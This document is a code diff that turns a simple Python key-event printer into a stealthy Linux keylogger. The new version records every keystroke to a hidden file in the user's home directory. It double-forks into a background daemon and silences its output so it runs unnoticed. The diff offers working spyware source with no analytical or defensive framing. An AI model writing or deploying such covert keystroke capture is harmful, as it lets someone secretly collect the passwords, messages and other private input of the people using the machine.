@@ -1,18 +1,49 @@
-import keyboard
+import os
 import sys
+import platform
+from pynput import keyboard
+from multiprocessing import Process
+import subprocess
 
-#defining what a keystroke is 
+os_name = platform.system()
 
-def keystroke(e):
-    print(f'Key {e.name} was {e.event_type}')
+if os_name == 'Linux':
+    log_file = os.path.expanduser("~/.keylog.txt")
 
-log = keyboard.hook(keystroke)
-original_stdout = sys.stdout
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            else:
+                f.write(f" [{key}] ")
 
-# Keep the program running
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
 
-keyboard.wait('esc')  
+def start_keylogger():
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
-# Waits until user presses esc (for debugging purposes)
-print(log)
+def daemonize():
+    if os.fork() > 0:
+        return
+    os.setsid()
+    if os.fork() > 0:
+        sys.exit()
+    sys.stdout = open(os.devnull, 'w')
+    sys.stderr = open(os.devnull, 'w')
+    sys.stdin = open(os.devnull, 'r')
+    start_keylogger()
+
+if __name__ == "__main__":
+    if os_name =='Linux':
+        Process(target=daemonize).start()
+        
 
